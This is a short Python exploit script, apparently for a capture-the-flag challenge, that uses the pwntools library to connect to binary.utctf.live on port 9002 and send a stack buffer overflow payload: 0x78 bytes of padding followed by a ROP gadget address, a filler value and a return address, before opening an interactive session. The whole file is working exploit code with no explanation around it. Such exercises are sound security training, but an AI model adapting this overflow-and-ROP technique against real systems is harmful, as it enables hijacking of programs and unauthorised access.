from pwn import *

rop_addr = 0x00400693
ret_addr = 0x004005ea
le_rop_addr = p64(rop_addr)
le_ret_addr = p64(ret_addr)

context.log_level = 'debug'

# p = process('./pwnable')
p = remote('binary.utctf.live', 9002)

# gdb.attach(p, "break * 0x004005b6") #main

p.sendafter('one!\n', 'A'*0x78 + le_rop_addr + p64(0xdeadbeef) + le_ret_addr + "\n")
p.interactive()

